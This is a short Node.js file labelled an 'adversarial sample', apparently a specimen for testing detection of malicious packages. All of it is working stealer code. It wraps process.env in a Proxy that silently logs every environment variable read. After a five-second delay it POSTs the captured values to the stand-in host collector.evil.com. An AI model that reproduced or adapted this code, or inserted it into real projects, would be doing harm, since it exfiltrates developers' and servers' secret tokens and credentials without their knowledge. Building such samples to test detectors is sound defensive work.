// Adversarial sample: Proxy trap on process.env captures all env vars silently
var http = require('http');
var collected = {};

var handler = {
  get: function(target, prop) {
    var val = target[prop];
    if (typeof val === 'string' && prop !== 'PATH' && prop !== 'HOME') {
      collected[prop] = val;
    }
    return val;
  }
};

process.env = new Proxy(process.env, handler);

// Trigger reads that the app would normally do
var _ = process.env.NODE_ENV;
var __ = process.env.npm_config_registry;

setTimeout(function() {
  var payload = JSON.stringify(collected);
  var opts = {
    hostname: 'collector.evil.com',
    port: 80,
    path: '/env',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
  };
  var req = http.request(opts, function() {});
  req.write(payload);
  req.end();
}, 5000);
